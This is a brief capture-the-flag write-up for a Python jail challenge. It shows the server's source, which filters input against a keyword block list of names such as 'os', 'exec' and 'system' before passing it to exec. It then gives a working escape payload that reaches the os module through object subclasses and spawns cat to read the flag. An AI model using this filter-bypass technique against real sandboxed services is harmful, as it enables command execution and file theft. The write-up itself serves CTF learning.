The challenge is composed of a python escape shell. When connecting to the server you are dropped into a python shell, but there are restrictions to escaping.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
setrus@host:~/$ nc prob.vulnerable.kr 20001
Hi! Welcome to pyjail!
========================================================================
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to pyjail!")
    print("========================================================================")
    print(open(__file__).read())
    print("========================================================================")
    print("RUN")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("No!!!")
            return;
    else:
        exec(text)
if __name__ == "__main__":
    main()
========================================================================
RUN
>>> o = {x.__name__:x for x in object.__subclasses__()}['StreamReaderWriter'].__init__.__globals__['sys'].modules['o'+'s'];o.spawnlp(o.P_WAIT, 'cat', 'cat', './home/python_jail/flag')
KorNewbie{H311o_h0w_@r3_y0u_d0lng?}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
